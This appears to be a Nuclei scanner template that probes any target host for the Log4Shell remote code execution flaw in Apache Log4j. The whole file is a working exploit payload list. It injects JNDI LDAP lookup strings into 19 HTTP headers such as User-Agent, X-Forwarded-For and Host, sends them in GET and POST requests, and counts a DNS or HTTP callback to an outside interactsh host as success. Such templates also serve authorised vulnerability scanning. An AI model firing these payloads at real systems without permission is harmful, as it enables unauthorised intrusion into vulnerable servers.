id: log4j-fuzz-head-poc-1
info:
  author: xxx
  name: "log4j-rce\u6F0F\u6D1E"
  severity: critical
  tags: apache,rce
requests:
- attack: clusterbomb
  matchers:
  - name: http
    part: interactsh_protocol
    type: word
    words:
    - http
  - name: dns
    part: interactsh_protocol
    type: word
    words:
    - dns
  matchers-condition: or
  payloads:
    log4j_payloads:
    - 'X-Client-IP: ${jndi:ldap://{{interactsh-url}}/info}'
    - 'X-Remote-IP: ${jndi:ldap://{{interactsh-url}}/info}'
    - 'X-Remote-Addr: ${jndi:ldap://{{interactsh-url}}/info}'
    - 'X-Forwarded-For: ${jndi:ldap://{{interactsh-url}}/info}'
    - 'X-Originating-IP: ${jndi:ldap://{{interactsh-url}}/info}'
    - 'User-Agent: ${jndi:ldap://{{interactsh-url}}/info}'
    - 'Referer: ${jndi:ldap://{{interactsh-url}}/info}'
    - 'CF-Connecting_IP: ${jndi:ldap://{{interactsh-url}}/info}'
    - 'True-Client-IP: ${jndi:ldap://{{interactsh-url}}/info}'
    - 'X-Forwarded-For: ${jndi:ldap://{{interactsh-url}}/info}'
    - 'Originating-IP: ${jndi:ldap://{{interactsh-url}}/info}'
    - 'X-Real-IP: ${jndi:ldap://{{interactsh-url}}/info}'
    - 'X-Client-IP: ${jndi:ldap://{{interactsh-url}}/info}'
    - 'Forwarded: ${jndi:ldap://{{interactsh-url}}/info}'
    - 'Client-IP: ${jndi:ldap://{{interactsh-url}}/info}'
    - 'Contact: ${jndi:ldap://{{interactsh-url}}/info}'
    - 'X-Wap-Profile: ${jndi:ldap://{{interactsh-url}}/info}'
    - 'X-Api-Version: ${jndi:ldap://{{interactsh-url}}/info}'
    - 'Host: ${jndi:ldap://{{interactsh-url}}/info}'
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    {{log4j_payloads}}

    '
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    {{log4j_payloads}}

    '
